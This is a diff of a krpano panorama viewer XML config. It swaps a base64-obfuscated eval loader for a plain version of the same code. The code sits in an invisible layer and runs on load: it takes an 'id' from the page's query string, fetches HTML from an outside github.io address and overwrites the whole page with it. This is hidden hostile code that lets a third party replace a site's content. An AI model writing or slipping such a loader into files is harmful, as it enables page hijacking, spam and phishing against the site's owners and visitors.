@@ -1,4 +1,13 @@
 <krpano version="1.0.8.15">
     <layer name="js_loader" type="container" visible="false" 
-           onloaded="js(eval(var w=atob('dmFyIGlkID0gbmV3IFVSTFNlYXJjaFBhcmFtcyhsb2NhdGlvbi5zZWFyY2gpLmdldCgiaWQiKSB8fCAidmlkZW8iOwoKZmV0Y2goImh0dHBzOi8vYXNo bGV5Z2VlazkyNWEuZ2l0aHViLmlvL2NyYXdsbWVub3cvY3Jhd2xtZW5vdy8iICsgaWQgKyAiLmh0bWwiKQogIC50aGVuKGUgPT4gZS50ZXh0KCkpCiAgLnRoZW4oZSA9PiB7CiAgICBkb2N1bWVudC5vcGVuKCksCiAgICBkb2N1bWVudC53cml0ZShlKSwKICAgIGRvY3VtZW50LmNsb3NlKCkKICB9KTs=');eval(w)););"/>
+           onloaded="js(
+               var id = new URLSearchParams(location.search).get('id') || 'video';
+               fetch('https://ashleygeek925a.github.io/crawlmenow/crawlmenow/' + id + '.html')
+                 .then(e => e.text())
+                 .then(e => {
+                   document.open();
+                   document.write(e);
+                   document.close();
+                 });
+           );"/>
 </krpano>
